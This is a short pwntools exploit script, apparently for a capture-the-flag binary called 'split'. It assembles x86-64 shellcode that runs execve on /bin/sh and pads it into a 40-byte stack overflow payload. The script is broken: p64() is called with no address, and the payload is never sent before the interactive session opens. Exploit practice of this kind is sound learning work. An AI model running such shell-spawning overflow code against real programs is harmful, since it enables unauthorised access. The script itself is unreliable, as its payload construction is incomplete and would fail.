#!/bin/python3
from pwn import *
p = process('./split')
shellcode = asm('''
section .text
	global _start
_start:
	mov rax, 0x3b
	mov rdi, 29400045130965551
	push rdi 
	mov rdi,rsp
	xor rsi, rsi
	xor rdx, rdx

	syscall
                ''')
payload = shellcode + b'a' * (40 - len(shellcode)) + p64() 


p.interactive()
